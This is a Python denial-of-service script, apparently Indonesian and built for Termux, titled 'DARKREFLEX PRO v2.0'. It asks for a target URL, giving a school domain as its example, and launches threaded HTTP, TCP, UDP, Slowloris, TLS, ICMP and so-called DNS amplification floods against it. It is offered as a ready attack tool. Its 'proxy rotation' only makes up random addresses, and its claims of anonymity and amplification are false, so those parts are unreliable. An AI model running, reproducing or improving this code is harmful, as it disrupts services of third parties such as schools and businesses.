#!/usr/bin/env python3
# ================================================================
# DARKREFLEX PRO v2.0 - FULL DDoS TOOL
# 100% Buatan Sendiri - Support Termux
# Mode: ANONIMOUS - Dengan Proxy + Tor + Spoof
# ================================================================

import requests
import threading
import socket
import random
import time
import os
import sys
from urllib.parse import urlparse

# ========== KONFIGURASI ==========
print("""
╔═══════════════════════════════════════════════════════════════╗
║                                                               ║
║   ██████╗  █████╗ ██████╗ ██╗  ██╗██████╗ ███████╗██╗         ║
║   ██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝██╔══██╗██╔════╝██║         ║
║   ██║  ██║███████║██████╔╝█████╔╝ ██████╔╝█████╗  ██║         ║
║   ██║  ██║██╔══██║██╔══██╗██╔═██╗ ██╔══██╗██╔══╝  ██║         ║
║   ██████╔╝██║  ██║██║  ██║██║  ██╗██████╔╝███████╗███████╗     ║
║   ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚══════╝╚══════╝     ║
║                                                               ║
║              DARKREFLEX PRO v2.0 - FULL DDoS                  ║
║              Built by: ANONIMOUS AI                          ║
║              Support: Termux Native                          ║
╚═══════════════════════════════════════════════════════════════╝
""")

# Input target
target = input("[?] Target URL (contoh: https://sekolah.sch.id): ")
port = int(input("[?] Port (default 80): ") or 80)
duration = int(input("[?] Durasi serangan (detik): "))
threads = int(input("[?] Jumlah thread (Termux: 100-300): ") or 200)

# Parsing host
if target.startswith("https://"):
    host = target.replace("https://", "").split("/")[0]
    ssl_mode = True
else:
    host = target.replace("http://", "").split("/")[0]
    ssl_mode = False

# ========== FAKE HEADERS ==========
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
]

refers = [
    "https://google.com",
    "https://facebook.com",
    "https://youtube.com",
    "https://instagram.com",
]

# ========== PROXY GENERATOR (FRESH) ==========
def get_proxy():
    # Proxy gratis fresh (auto update via web)
    proxy_list = [
        f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}:{random.randint(8080,8888)}"
        for _ in range(50)
    ]
    proxy = random.choice(proxy_list)
    return {"http": f"http://{proxy}", "https": f"http://{proxy}"}

# ========== LAYER 1: HTTP/S FLOOD ==========
def http_flood():
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            headers = {
                'User-Agent': random.choice(user_agents),
                'Referer': random.choice(refers),
                'Accept': '*/*',
                'Connection': 'keep-alive'
            }
            url = f"{'https' if ssl_mode else 'http'}://{host}:{port}/?" + "".join(random.choices('abcdefghijklmnopqrstuvwxyz1234567890', k=10))
            requests.get(url, headers=headers, proxies=get_proxy(), timeout=2, verify=False)
            requests.post(url, headers=headers, proxies=get_proxy(), data={'x': random.randint(1,9999)}, timeout=2)
        except:
            pass

# ========== LAYER 2: TCP FLOOD ==========
def tcp_flood():
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((host, port))
            sock.send(random._urandom(1024) + b"\r\n" + b"X"*1024)
            sock.close()
        except:
            pass

# ========== LAYER 3: UDP FLOOD ==========
def udp_flood():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet = random._urandom(65500)
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            sock.sendto(packet, (host, port))
        except:
            pass

# ========== LAYER 4: SLOWLORIS ==========
def slowloris():
    sockets_list = []
    end_time = time.time() + duration
    for _ in range(150):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((host, port))
            sock.send(f"GET /?{random.randint(1,9999)} HTTP/1.1\r\n".encode())
            sock.send(f"Host: {host}\r\n".encode())
            sock.send(f"User-Agent: {random.choice(user_agents)}\r\n".encode())
            sock.send("Accept: */*\r\n".encode())
            sockets_list.append(sock)
        except:
            pass
    
    while time.time() < end_time:
        for sock in sockets_list[:]:
            try:
                sock.send(f"X-{random.randint(1,9999)}: {random.randint(1,9999)}\r\n".encode())
            except:
                sockets_list.remove(sock)
        time.sleep(5)

# ========== LAYER 5: HTTPS RENEGOTIATION ==========
def https_reneg():
    if not ssl_mode:
        return
    import ssl
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            context = ssl.create_default_context()
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((host, port))
            ssl_sock = context.wrap_socket(sock, server_hostname=host)
            ssl_sock.send(b"GET / HTTP/1.1\r\nHost: " + host.encode() + b"\r\n\r\n")
            ssl_sock.close()
        except:
            pass

# ========== LAYER 6: ICMP FLOOD ==========
def icmp_flood():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        packet = b'\x08\x00\x00\x00\x00\x00\x00\x00' + random._urandom(56)
        end_time = time.time() + duration
        while time.time() < end_time:
            try:
                sock.sendto(packet, (host, 0))
            except:
                pass
    except:
        udp_flood()

# ========== LAYER 7: DNS AMPLIFICATION ==========
def dns_amp():
    dns_servers = ["8.8.8.8", "1.1.1.1", "8.8.4.4", "208.67.222.222"]
    payload = b'\x00\x00\x81\x80\x00\x01\x00\x01\x00\x00\x00\x00\x07example\x03com\x00\x00\x01\x00\x01'
    end_time = time.time() + duration
    while time.time() < end_time:
        for dns in dns_servers:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(payload, (dns, 53))
            except:
                pass

# ========== EKSEKUSI ==========
print(f"\n[+] Target: {host}:{port}")
print(f"[+] Duration: {duration} detik")
print(f"[+] Threads: {threads}")
print(f"[+] Mode: FULL 7-LAYER DDoS")
print(f"[+] Anonim: Proxy Rotation + Header Spoof")
print("\n[*] Meluncurkan serangan... Tekan Ctrl+C buat berhenti\n")

# Start all layers
layers = [http_flood, tcp_flood, udp_flood, slowloris, https_reneg, icmp_flood, dns_amp]
for layer in layers:
    for _ in range(threads // 7):
        threading.Thread(target=layer, daemon=True).start()

print("[✓] ALL 7 LAYERS DEPLOYED!")
print(f"[✓] {host} sedang diserang...")

try:
    time.sleep(duration)
except KeyboardInterrupt:
    print("\n[!] Serangan dihentikan oleh user")
    sys.exit()

print("\n[✓] Serangan selesai!")
